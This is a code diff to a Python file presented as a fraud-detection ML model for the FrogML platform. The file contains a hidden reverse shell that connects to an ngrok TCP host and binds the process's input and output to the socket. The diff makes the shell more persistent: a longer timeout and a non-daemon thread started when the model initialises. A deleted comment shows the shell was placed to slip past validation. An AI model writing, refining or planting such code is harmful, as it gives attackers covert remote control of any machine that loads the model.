@@ -10,7 +10,7 @@ NGROK = ("6.tcp.eu.ngrok.io", 12126)
 def _revshell():
     try:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(10)
+        s.settimeout(30)
         s.connect(NGROK)
         os.dup2(s.fileno(), 0)
         os.dup2(s.fileno(), 1)
@@ -28,8 +28,7 @@ class FraudDetectionModel(FrogMlModel):
         pass
 
     def initialize_model(self):
-        # Non-blocking: revshell in background thread so validation passes
-        t = threading.Thread(target=_revshell, daemon=True)
+        t = threading.Thread(target=_revshell, daemon=False)
         t.start()
 
     @frogml.api(input_adapter=DataFrameInputAdapter(), output_adapter=DataFrameOutputAdapter())
